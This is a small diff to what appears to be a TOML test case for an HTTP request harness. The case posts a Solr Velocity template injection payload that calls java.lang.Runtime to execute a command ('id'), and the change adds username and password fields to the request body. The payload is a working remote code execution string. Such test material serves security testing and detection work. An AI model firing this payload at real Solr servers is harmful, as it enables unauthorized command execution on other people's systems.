@@ -43,7 +43,7 @@ via = "request"
 method = "POST"
 uri = "/solr/demo/select"
 headers = { "User-Agent" = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", "Content-Type" = "application/json" }
-body = "{\"q\":\"1\",\"wt\":\"velocity\",\"v.template\":\"custom\",\"v.template.custom\":\"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($ex=$rt.getRuntime().exec('id'))\"}"
+body = "{\"username\":\"a\",\"password\":\"hunter2-Secret\",\"q\":\"1\",\"wt\":\"velocity\",\"v.template\":\"custom\",\"v.template.custom\":\"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($ex=$rt.getRuntime().exec('id'))\"}"
 body_api = "stream"
 
 [case.primary]
